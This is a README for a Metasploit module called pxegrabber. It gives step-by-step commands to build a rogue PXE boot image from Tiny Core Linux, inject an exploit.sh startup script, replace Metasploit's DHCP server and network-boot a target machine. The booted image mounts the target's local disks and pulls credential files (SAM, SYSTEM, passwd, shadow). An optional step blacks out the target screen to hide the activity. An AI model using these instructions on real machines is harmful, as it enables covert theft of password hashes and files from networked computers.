PXEGRABBER
==========

This metasploit module loads an Tiny Core kernel & initrd into memory and serves it as a PXE bootable image.
After PXE-booting the target, the script mounts all local disks and searches it for files.


Download Tiny Core Base System
```
wget -O /tmp/core.iso http://distro.ibiblio.org/tinycorelinux/5.x/x86/release/Core-current.iso
```

Extract neccesary files:
```
mkdir /mnt/cdrom && mount -o ro /tmp/core.iso /mnt/cdrom/
cp /mnt/cdrom/boot/core.gz /tmp/
cp /mnt/cdrom/boot/vmlinuz /tmp/
gunzip /tmp/core.gz
```

Make necessary files and directories 
```
mkdir -p /usr/share/metasploit-framework/data/exploits/pxexploit/pxegrabber/tmp
```

Extract Tiny Core filesystem
```
cd /usr/share/metasploit-framework/data/exploits/pxexploit/pxegrabber/tmp
cpio -idv </tmp/core
```

Customize Tiny Core filesystem
```
cp ./exploit.sh /usr/share/metasploit-framework/data/exploits/pxexploit/pxegrabber/tmp/etc/init.d/exploit.sh
cp ./tftp.tcz /usr/share/metasploit-framework/data/exploits/pxexploit/pxegrabber/tmp/tmp/tftp.tcz

echo "sudo -u tc sh -c \"tce-load -i /tmp/tftp.tcz\"" >> /usr/share/metasploit-framework/data/exploits/pxexploit/pxegrabber/tmp/opt/bootlocal.sh
echo "sudo /etc/init.d/exploit.sh" >> /usr/share/metasploit-framework/data/exploits/pxexploit/pxegrabber/tmp/opt/bootlocal.sh
```


Compress filesystem and kernel for PXE
```
cd /usr/share/metasploit-framework/data/exploits/pxexploit/pxegrabber/tmp/
cp /tmp/vmlinuz ../kernel
find . | cpio -o -H newc | gzip > ../initrd
```

Revert to working Metasploit DHCP module
```
mv /usr/share/metasploit-framework/lib/rex/proto/dhcp/server.rb /usr/share/metasploit-framework/lib/rex/proto/dhcp/old_server.rb
cp ./dhcpserver.rb /usr/share/metasploit-framework/lib/rex/proto/dhcp/server.rb
cp ./pxegrabber.rb /usr/share/metasploit-framework/modules/exploits/multi/misc/pxegrabber.rb
```

OPTIONAL
To blackout the target screen adjust the PS1 rule in ./etc/skel/.profile
```
PS1='\[\e[0;30m\]\[\e[40m\]\[\e[40m\] '
```

Run the pxegrabber
```
/etc/init.d/networing stop
/etc/init.d/network-manager stop
ifconfig eth0 10.0.0.1 netmask 255.255.255.0
msfconsole
use exploit/multi/misc/pxegrabber
set SRVHOST 10.0.0.1
```

OPTIONAL
```
search for custom files (other than SAM/SYSTEM/passwd/shadow)
set FILES first.txt,second.txt,third.txt
```

```
exploit
```

Start target in PXE boot mode

